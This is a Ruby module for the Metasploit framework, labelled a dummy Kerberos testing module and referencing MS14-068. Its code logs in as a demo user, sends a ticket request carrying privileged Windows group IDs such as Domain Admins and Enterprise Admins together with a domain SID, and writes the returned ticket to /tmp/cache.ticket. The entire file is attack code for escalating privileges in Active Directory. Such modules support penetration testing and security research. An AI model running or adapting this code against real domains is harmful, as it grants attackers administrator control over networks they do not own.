##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit4 < Msf::Auxiliary

  include Msf::Kerberos::Microsoft::Client

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Dummy Kerberos testing module',
      'Description' => %q{
        Dummy Kerberos testing module
      },
      'Author' =>
        [
					'juan vazquez'
        ],
      'References' =>
        [
          ['MSB', 'MS14-068']
        ],
      'License' => MSF_LICENSE,
      'DisclosureDate' => 'Dec 25 2014'
    ))
  end

  def run

    opts = {
      client_name: 'juan',
      server_name: 'krbtgt/DEMO.LOCAL',
      realm: 'DEMO.LOCAL',
      key: OpenSSL::Digest.digest('MD4', Rex::Text.to_unicode('juan'))
    }

		connect(:rhost => datastore['RHOST'])
    print_status("Sending AS-REQ...")

    pre_auth = []
    pre_auth << build_as_pa_time_stamp(opts)
    pre_auth << build_pa_pac_request(opts)
    pre_auth
    opts.merge!({:pa_data => pre_auth})

    res = send_request_as(opts)

    unless res.msg_type == 11
      print_error("invalid response :(")
      return
    end

    print_good("good answer!")
    opts.delete(:pa_data)
    print_status("Parsing AS-REP...")

    session_key = extract_session_key(res, opts[:key])
    logon_time = extract_logon_time(res, opts[:key])

    ticket = res.ticket

    opts.merge!(
      logon_time: logon_time,
      session_key: session_key,
      ticket: ticket,
      group_ids: [513, 512, 520, 518, 519],
      domain_id: 'S-1-5-21-1755879683-3641577184-3486455962'
    )
    print_status("Sending TGS-REQ...")
    res = send_request_tgs(opts)

    unless res.msg_type == 13
      print_error("invalid response :(")
      return
    end

    print_good("Valid TGS-Response")

    cache = extract_kerb_creds(res, 'AAAABBBBCCCCDDDD')

    pp cache

    f = File.new('/tmp/cache.ticket', 'wb')
    f.write(cache.encode)
    f.close
  end
end

